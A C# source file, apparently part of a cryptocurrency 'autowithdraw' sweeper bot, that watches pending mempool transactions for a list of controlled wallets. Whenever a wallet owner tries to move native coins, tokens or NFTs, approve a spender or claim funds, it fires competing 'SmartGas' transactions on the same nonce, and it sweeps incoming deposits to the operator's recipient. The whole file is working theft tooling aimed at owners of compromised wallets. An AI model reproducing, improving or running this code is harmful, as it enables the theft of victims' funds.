using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Main.Actions;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.WebSocketStreamingClient;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.RPC.Reactive.Eth.Subscriptions;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Numerics;
using System.Threading.Tasks;

namespace Autowithdraw.Main.Handlers
{
    internal class Pending
    {
        public static Dictionary<int, long> PendingWork = new Dictionary<int, long>();
        public Web3 W3;
        public int ChainID;
        public Pending(int ChainID)
        {
            W3 = Settings.Chains[ChainID].Web3;
            this.ChainID = ChainID;
        }

        public async Task Starter()
        {
            using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[ChainID].WSS);
            var subscription = new EthNewPendingTransactionObservableSubscription(client);

            subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async txHash =>
            {
                try
                {
                    PendingWork[ChainID] = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds();

                    #region Values

                    Transaction Transaction = await W3.Eth.Transactions.GetTransactionByHash.SendRequestAsync(txHash);
                    if (Transaction == null || Transaction.To == null || (await W3.Eth.GasPrice.SendRequestAsync()).Value - Transaction.GasPrice > 6000000000)
                        return;

                    string ContractAddress = Web3.ToChecksumAddress(Transaction.To);
                    string Address_From = Web3.ToChecksumAddress(Transaction.From);
                    string Address_To = Web3.ToChecksumAddress(Transaction.To);
                    string Input = Transaction.Input;
                    float Price = Pricing.GetPrice(Transaction.Value, ChainID);

                    #endregion

                    try
                    {
                        if (Settings.Chains[ChainID].Contract.ContractAddress == ContractAddress)
                            return;
                    }
                    catch
                    {
                        // ignored
                    }

                    #region SmartGas

                    if (Settings.Wallets.Keys.Contains(Address_From))
                    {
                        if (Address_To != Settings.Config.Recipient &&
                            Address_To != Settings.Config.Proxy.Address)
                        {
                            try
                            {
                                Address_To = Cast.ParseAddress(Input, Input.StartsWith("0x23b872dd") || Input.StartsWith("0x42842e0e"));
                                BigInteger Wei = Cast.ParseWei(Input, Input.StartsWith("0x23b872dd") || Input.StartsWith("0x42842e0e"));

                                #region Tokens

                                if (Input.StartsWith("0xa9059cbb") &&
                                    Address_To != Settings.Config.Recipient &&
                                    Address_To != Settings.Config.Proxy.Address)
                                {
                                    string Mutex = Address_From + ContractAddress + "Token";

                                    await Task.Factory.StartNew(() => SmartGas.Token(Address_From, ContractAddress,
                                        Address_To,
                                        Wei,
                                        Transaction.GasPrice.Value,
                                        Transaction.Nonce, SmartGas.Busy.Contains(Mutex), ChainID));

                                    SmartGas.Busy.Add(Mutex);

                                    await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 0,
                                        Address_From, ChainID, txHash, fromPending: true));
                                }

                                #endregion

                                #region NFT

                                if (Input.StartsWith("0x23b872dd") || Input.StartsWith("0x42842e0e"))
                                {
                                    string Mutex = Address_From + ContractAddress + Wei;
                                    await Task.Factory.StartNew(() => SmartGas.NFT(Address_From, ContractAddress,
                                        Cast.ParseAddress(Input, true),
                                        Address_To,
                                        Wei,
                                        Transaction.GasPrice.Value,
                                        Transaction.Gas.Value,
                                        Transaction.Nonce, SmartGas.Busy.Contains(Mutex), Input.StartsWith("0x42842e0e"), ChainID));
                                    SmartGas.Busy.Add(Mutex);
                                }

                                #endregion

                                #region Approve

                                if (Input.StartsWith("0x095ea7b3"))
                                {
                                    if (Address_To == Settings.Config.Proxy.Address)
                                    {
                                        if (Wei <= Settings.MinInt && Wei != -1)
                                            await Task.Factory.StartNew(() => SmartGas.Approve(Address_From,
                                                ContractAddress,
                                                Address_To,
                                                Transaction.GasPrice.Value,
                                                Transaction.Gas.Value,
                                                Transaction.Nonce, ChainID));
                                        else
                                            await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 1,
                                                Address_From, ChainID, txHash, fromPending: true, fromApprove: true));
                                    }

                                    if (Address_To != Settings.Config.Recipient &&
                                        Address_To != Settings.Config.Proxy.Address)
                                    {
                                        if ((Wei > Settings.MinInt || Wei == -1) && !AutoApprove.Approved.Contains(Address_To))
                                        {
                                            await Task.Factory.StartNew(() => SmartGas.Approve(Address_From,
                                                ContractAddress,
                                                Address_To,
                                                Transaction.GasPrice.Value,
                                                Transaction.Gas.Value,
                                                Transaction.Nonce, ChainID));
                                        }

                                        await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 0,
                                            Address_From, ChainID, txHash, fromPending: true, fromApprove: true));
                                    }
                                }

                                #endregion
                            }
                            catch
                            {
                                #region Transfers

                                if (Price >= 2)
                                {
                                    string Mutex = Address_From + Transaction.Nonce.Value;
                                    await Task.Factory.StartNew(() => SmartGas.Native(Address_From,
                                        Address_To,
                                        Transaction.GasPrice.Value,
                                        Transaction.Nonce,
                                        SmartGas.Busy.Contains(Mutex),
                                        ChainID));
                                    SmartGas.Busy.Add(Mutex);
                                }

                                #endregion

                                #region Claims and Other

                                if (Input != "0x")
                                {
                                    if ((Input.StartsWith("0x4e71d92d") || Input.StartsWith("0xfb48d48a") || Input.StartsWith("0x3ccfd60b")) &&
                                        Settings.Block.Contains(ContractAddress))
                                        await Task.Factory.StartNew(() => SmartGas.Claim(Address_From,
                                            Transaction.GasPrice,
                                            Transaction.Gas,
                                            Transaction.Nonce,
                                            ChainID));
                                    else
                                        await Task.Factory.StartNew(() => Parse.Transaction(txHash, ChainID));
                                }

                                #endregion
                            }
                        }
                    }
                    else if (Input.StartsWith("0x23b872dd") && Address_From != Settings.Config.Proxy.Address)
                    {
                        string AddressFrom = Cast.ParseAddress(Input, true);
                        if (Settings.Wallets.Keys.Contains(AddressFrom))
                        {
                            Address_To = Cast.ParseAddress(Input, true, true);
                            BigInteger Wei = Cast.ParseWei(Input, true);
                            if (Address_To != Settings.Config.Recipient &&
                                Address_To != Settings.Config.Proxy.Address &&
                                Wei != 0)
                            {
                                await SmartGas.TransferFrom(AddressFrom, Address_From, ContractAddress, Transaction.GasPrice, Transaction.Gas, ChainID);
                            }
                        }
                    }
                    #endregion

                    #region Transfers

                    if (!Settings.Wallets.Keys.Contains(Address_To))
                    {
                        try
                        {
                            Address_To = Cast.Sub(Input);
                        }
                        catch
                        {
                            try
                            {
                                Address_To = Cast.ParseAddress(Input);
                            }
                            catch
                            {
                                // ignored
                            }
                        }
                        if (Address_To.Split('0').Length > 10 || Address_To.Split('f').Length > 10)
                            Address_To = ContractAddress;
                    }

                    if (Settings.Wallets.Keys.Contains(Address_To))
                    {
                        #region Native

                        if (Transaction.Value != new HexBigInteger(0) && Address_From != Settings.Chains[ChainID].Contract.Sponsor && Address_To != Settings.Config.Recipient)
                        {
                            if ((Price >= 3 || ChainID != 1) &&
                                Settings.Wallets.Keys.Contains(Address_To) &&
                                !Transfer.Busy.Contains(Address_To))
                            {
                                Transfer.Busy.Add(Address_To);
                                await Task.Factory.StartNew(() =>
                                    Transfer.Native(Address_To, Transaction.Value, ChainID));
                            }
                        }

                        #endregion

                        #region Tokens

                        if (Input.StartsWith("0xa9059cbb"))
                        {
                            await Task.Factory.StartNew(() => Parse.Token(ContractAddress,
                                Cast.ParseWei(Input),
                                Address_To,
                                ChainID,
                                txHash,
                                fromPending: true));
                        }

                        #endregion
                    }

                    #endregion

                    #region Internal

                    else if ((Transaction.Value.Value == 0 || Price >= 3) && !Input.StartsWith("0x23b872dd") && !Input.StartsWith("0xa9059cbb") && !Input.StartsWith("0x095ea7b3") && !Settings.Config.Other.ScamTokens.Contains(ContractAddress))
                        await Task.Factory.StartNew(() => Helper.Internal(Input, ContractAddress, ChainID));

                    #endregion
                }
                catch (NullReferenceException)
                {
                    // ignored
                }
                catch (ArgumentOutOfRangeException)
                {
                    // ignored
                }
                catch (IndexOutOfRangeException)
                {
                    // ignored
                }
                catch (Nethereum.JsonRpc.Client.RpcClientTimeoutException)
                {
                    Logger.Error($"[Filter] {Settings.Chains[ChainID].API} not responding");
                }
                catch (Exception e) { Logger.Error(e); }
            });

            await client.StartAsync();
            await subscription.SubscribeAsync();
            await Task.Delay(-1);
        }
    }
}
